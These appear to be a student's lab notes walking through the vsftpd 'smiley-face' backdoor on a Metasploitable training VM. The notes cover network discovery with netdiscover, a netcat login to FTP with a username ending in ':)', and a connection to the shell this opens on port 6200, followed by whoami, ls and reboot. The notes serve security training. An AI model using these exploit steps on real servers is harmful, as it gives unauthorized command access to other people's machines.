Backdoor vulnerability

Connect into the FTP server using a username ending in :) and an invalid password
Opens a shell on port 6200. Allows hacker to run commands on machine

Step 1 is identifying the unit we want to connect to. (IP ADDRESS)

(Linux) sudo netdiscover
[Allows you to find the ip addresses on the network]

Netcat (nc) - Allows you to connect to the FTP server and can run network functions from
the command line.

This will be to open a TCP socket to server:

nc <ip of MetasploitableVM> 21[port number (FTP usually runs on port 21]
user bones:)  [ending in :)]
pass trout    [fill with whatever]

Now that we are in we can go in through the backdoor:
nc -v <ip of MetasploitableVM> 6200

ls (How to look at all the commands)
whoami [what access I have]
reboot [Reboot the device]

CMD		mousepad & 		(Opens a mousepad in Kali linux)
